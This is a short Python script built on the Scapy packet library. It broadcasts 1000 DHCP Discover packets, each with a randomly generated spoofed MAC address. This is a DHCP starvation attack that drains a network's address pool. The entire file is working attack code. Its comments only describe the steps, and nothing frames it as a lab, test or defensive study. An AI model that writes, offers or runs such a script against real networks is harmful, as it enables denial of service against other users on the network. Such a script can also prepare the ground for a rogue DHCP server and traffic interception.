from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.sendrecv import sendp

# This function sends a DHCP discover packet
def send_dhcp_discover(mac):
    dhcp_discover = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(dhcp_discover, verbose=0)

# This function generates random MAC addresses
def generate_random_mac():
    import random
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

# Number of requests to send
num_requests = 1000

# Sending multiple DHCP Discover packets with random MAC addresses
for _ in range(num_requests):
    random_mac = generate_random_mac()
    send_dhcp_discover(random_mac)
    print(f"Sent DHCP Discover with MAC {random_mac}")

print("Finished sending DHCP Discover packets")